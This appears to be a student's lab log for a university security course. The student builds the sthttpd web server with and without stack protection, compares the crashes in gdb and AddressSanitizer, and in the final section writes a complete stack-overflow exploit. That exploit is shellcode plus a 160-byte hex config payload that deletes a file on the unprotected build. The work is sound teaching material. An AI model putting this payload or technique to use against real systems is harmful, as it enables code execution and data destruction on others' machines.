1.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To append the path:

$ export PATH=/usr/local/cs/bin:$PATH
$ echo $PATH
$ which gcc

2.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Get the patch from online and untar it:
$ wget https://web.cs.ucla.edu/classes/fall18/cs33/lab/sthttpd-2.27.0.tar.gz
$ tar -xf sthttpd-2.27.0.tar.gz

Make a patch file and apply it in the directory:
$ emacs patch.txt
$ patch -p0 -i patch.txt

configure it based on the spec:
$ ./configure \
   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

compile SP:
$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
$ mv src/thttpd src/thttpd-sp

compile AS:
**NOTE** I had to add the flag -static-libasan to AS because I was getting an 
error when I was trying to debug it in gdb**

$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
$ mv src/thttpd src/thttpd-as

compile NO:
$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
$ mv src/thttpd src/thttpd-no

3.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
to calculate the ports i made a small function with my UID: 004903420
$ emacs calc.c

int main()
{
  int x = 12330 + 3*(4903420%293) + 1;
  printf("%d\n", x);
}

gcc calc.c -o calc
./calc
output: 12526

SP: 12526
AS: 12527
NO: 12528

made the file foo.txt to test it:
in sthttpd-2.27.0:

$ emacs foo.txt
"hello
testing
foo
smashing lab
......."

4.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
for SP:
$ src/thttpd-sp -p 12526 -D
Go into new terminal and log into seasnet to test it:
$ curl http://localhost:12526/foo.txt
"hello
testing
foo
smashing lab
......."

for AS:
$ src/thttpd-as -p 12527 -D
Go into	new terminal and log into seasnet to test it:
$ curl http://localhost:12527/foo.txt
"hello
testing
foo
smashing lab
......."

for NO:
$ src/thttpd-no -p 12528 -D
Go into new terminal and log into seasnet to test it:
$ curl http://localhost:12528/foo.txt
"hello
testing
foo
smashing lab
......."

5.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Make a file that will cause it to crash (a char that has over 100 char since
that was the max array size from the patch)
$ emacs breakit.txt

breakit.txt:
port=hellohellohellohellohellohello... over 100 char

to run it in gdb:
$ gdb thttpd-sp
(gdb) r -p 12526 -D -C breakit.txt
Starting program: /w/home.13/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp -p 12526 -D -C breakit.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
*** stack smashing detected ***: /w/home.13/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1

There was a seg fault that caused it to crase
getting the backtrace:
(gdb) bt
#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000404165 in read_config (filename=<optimized out>) at thttpd.c:1129
#7  0x6f6c6c65686f6c6c in ?? ()
#8  0x6c65686f6c6c6568 in ?? ()
#9  0x686f6c6c65686f6c in ?? ()
#10 0x6c6c65686f6c6c65 in ?? ()
#11 0x65686f6c6c65686f in ?? ()
#12 0x6f6c6c65686f6c6c in ?? ()
#13 0x0000006f6c6c6568 in ?? ()
#14 0x0000000000000000 in ?? ()

Once the program hit line 1129 in thttpd.c, it crashed
disassemble the code at that point

(gdb) disas 0x0000000000404165

Then I can see:

0x0000000000404052 <+1154>:	xor    %fs:0x28,%rax
0x000000000040405b <+1163>:	jne    0x404160 <read_config+1424>

Then at offset 1424:
0x0000000000404160 <+1424>:	callq  0x4023f0 <__stack_chk_fail@plt>

This is what caused it to crash with the stack fail.
It failed because the two parameters for xor were not equal.

6.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
**NOTE** I had to add the flag -static-libasan while compiling this one 
because without it I got the error:

error while loading shared libraries: libasan.so.5: wrong ELF class: ELFCLASS32
[Inferior 1 (process 21757) exited with code 0177]

run in gdb and do the same as before:

$ gdb thttpd-as
(gdb) r -p 12527 -D -C breakit.txt
Starting program: /w/home.13/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd-as -p 12527 -D -C breakit.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
=================================================================
==23866==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcbd4 at pc 0x00000048a72c bp 0x7fffffffcb30 sp 0x7fffffffc2e0
READ of size 207 at 0x7fffffffcbd4 thread T0
    #0 0x48a72b in __interceptor_strchr ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:618
    #1 0x50b6dd in read_config /u/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:1018
    #2 0x50c20e in parse_args /u/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:893
    #3 0x40680b in main /u/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:380
    #4 0x7ffff6cb93d4 in __libc_start_main (/lib64/libc.so.6+0x223d4)
    #5 0x407a59  (/w/home.13/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd-as+0x407a59)

Address 0x7fffffffcbd4 is located in stack of thread T0 at offset 132 in frame
    #0 0x50b62f in read_config /u/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd.c:1000

  This frame has 1 object(s):
    [32, 132) 'line' <== Memory access at offset 132 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:618 in __interceptor_strchr
Shadow bytes around the buggy address:
  0x10007fff7920: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7930: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7950: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7960: 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00
=>0x10007fff7970: 00 00 00 00 00 00 00 00 00 00[04]f2 f2 f2 f3 f3
  0x10007fff7980: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7990: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 04 f2 f2 f2
  0x10007fff79a0: f2 f2 f2 f2 04 f2 f2 f2 f2 f2 f2 f2 00 00 f2 f2
  0x10007fff79b0: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff79c0: 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==23866==ABORTING
[Inferior 1 (process 23866) exited with code 01]

to get backtrace, but it doesnt work because theres no stack
(gdb) bt
No stack.

instead set a break at like 1018, since thats where the problem was in read_config
(gdb) b thttpd.c:1018
(gdb) set disassemble-next-line on
(gdb) r -p 12527 -D -C breakit.txt

=> 0x000000000050b6d0 <read_config+176>:     48 8b 3c 24	mov    (%rsp),%rdi
   0x000000000050b6d4 <read_config+180>:     be 23 00 00 00	mov    $0x23,%esi
   0x000000000050b6d9 <read_config+185>:     e8 e2 f2 f7 ff	callq  0x48a9c0 <__interceptor_strchr(char const*, int)>
   0x000000000050b6de <read_config+190>:     48 85 c0 test   %rax,%rax
   0x000000000050b6e1 <read_config+193>:     74 23 je     0x50b706 <read_config+230>

it seems that the interceptor_strchr crashed it.

7.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

test the crash on gdb:
$ gdb thttpd-no
(gdb) r -p 12528 -D -C breakit.txt
Starting program: /w/home.13/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd-no -p 12528 -D -C breakit.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
1189		       (void) fclose( fp );

(gdb) bt
#0  0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
#1  0x6f6c6c65686f6c6c in ?? ()
#2  0x6c65686f6c6c6568 in ?? ()
#3  0x686f6c6c65686f6c in ?? ()
#4  0x6c6c65686f6c6c65 in ?? ()
#5  0x65686f6c6c65686f in ?? ()
#6  0x6f6c6c65686f6c6c in ?? ()
#7  0x0000006f6c6c6568 in ?? ()
#8  0x0000000000000000 in ?? ()

(gdb) disas 0x0000000000403f79

=> 0x0000000000403f79 <+1145>:	retq 

it broke because of a seg fault at line 1189

8.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

compile using -s for all the variants:
$ make clean
$ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
$ mv src/thttpd.o src/thttpd-sp.s

$ make clean
$ make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
$ mv src/thttpd.o src/thttpd-as.s

$ make clean
$ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
$ mv src/thttpd.o src/thttpd-no.s

looking at the assembly code:

At the beginning of handle_read, the AS disassembly has a lot of checking 
that looks like this:
cmpb    $0, 2147450880(%rdx)
jne     .L1228

At the end of the function disassembly it has a lot of these type of lines:
movq    %r13, %rdi
call    __asan_report_load8

This prevents buffer-overrun exploits in handle_read.

SP and NO are very similar in my code.

9.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To build the exploit we first have to go into gdb for thttpd-no

$ gdb thttpd-no
(gdb) print &line
$1 = (char (*)[100]) 0x7fffffffcd20

This is the line that we can exploit to hack the server

then to find the address of the stack pointer:

(gdb) info reg rsp
rsp            0x7fffffffcdb8	0x7fffffffcdb8

There are 152 bytes that we have to fill:
0x7fffffffcdb8 - 0x7fffffffcd20 = 0x98 = 152

Then to find the disassembly code for unlink:

(gdb) disas /r unlink
Dump of assembler code for function unlink:
   0x00007ffff76c03a0 <+0>:	    b8 57 00 00 00	mov    $0x57,%eax
   0x00007ffff76c03a5 <+5>:	    0f 05 syscall 
   0x00007ffff76c03a7 <+7>:	    48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
   0x00007ffff76c03ad <+13>:	    73 01 jae    0x7ffff76c03b0 <unlink+16>
   0x00007ffff76c03af <+15>:	    c3 retq   
   0x00007ffff76c03b0 <+16>:	    48 8b 0d b9 4a 2d 00	mov    0x2d4ab9(%rip),%rcx        # 0x7ffff7994e70
   0x00007ffff76c03b7 <+23>:	    f7 d8 neg    %eax
   0x00007ffff76c03b9 <+25>:	    64 89 01	 mov    %eax,%fs:(%rcx)
   0x00007ffff76c03bc <+28>:	    48 83 c8 ff	 or     $0xffffffffffffffff,%rax
   0x00007ffff76c03c0 <+32>:	    c3 retq   
End of assembler dump.

from this dump we can see that we need to perform the mov $0x57,%eax to 
be able to perform the syscall

to find the assembly for the string victim, i used the xxd command using a file
i made named victim.txt with the string "victim.txt" in it.

$ xxd victim.txt
0000000: 7669 6374 696d 2e74 7874 0a              victim.txt.

This is the assembly for the string, omitting the next line character 0a,
7669 6374 696d 2e74 7874

Using the same strategy	for port= :
0000000: 706f 7274 3d0a                           port=.
706f 7274 3d00 0000

We need to allocate 16 bytes of memory for the string, since there are 10 bytes 
in the string and we need to align it:

0x7fffffffcdb8 - 16 = 0x7fffffffcda8

Then we need to write our own unlink.s to get the disassembly
using the address from above and the move 57:

movq $0x7fffffffcda8, %rdi
movq $0x57, %rax
syscall

Then to get the disassembly from it:

$ gcc -c unlink.s
$ objdump -d unlink.o

unlink.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:		 48 bf a8 cd ff ff ff	movabs $0x7fffffffcda8,%rdi
   7:		 7f 00 00 
   a:		 48 c7 c0 57 00 00 00	mov    $0x57,%rax
  11:		 0f 05                	syscall 

This would mean that the exploit would be the disassembly for:
"port =" 
706f 7274 3d00 0000

and then next would be the 
disassembly from above for the syscall, followed by a bunch of null bytes to 
fill the 152 bytes. 
48 bf a8 cd ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05

Then at the end would be the disassembly for the string
"victim.txt"
76 69 63 74 69 6d 2e 74 78 74

and lastly, the address at the end would be the address of the array with 8 bytes added:
0x7fffffffcd20 + 0x8 = 0x7fffffffcd28

0000000: 70 6f 72 74 3d 00 00 00 48 bf a8 cd ff ff ff 7f
0000010: 00 00 48 c7 c0 57 00 00 00 0f 05 00 00 00 00 00
0000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0000030: 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00 00
0000040: 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00 00
0000050: 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00 00
0000060: 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00 00
0000070: 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00 00
0000080: 00 00 00 00 00 00 00 00 76 69 63 74 69 6d 2e 74 
0000090: 78 74 00 00 00 00 00 00 28 cd ff ff ff 7f 00 00

Add this code chunk to a file called exploit.txt

(gdb) r -p 12526 -D -C exploit.txt
Starting program: /w/home.13/ma/ugrad/westerga/cs33/lab3/sthttpd-2.27.0/src/thttpd-no -p 12526 -D -C exploit.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffcd3b in ?? ()
Missing separate debuginfos, use: debuginfo-install glibc-2.17-222.el7.x86_64 nss-softokn-freebl-3.36.0-5.el7_5.x86_64

The program failed, and when i went back into src directory...
victim.txt was deleted!!!

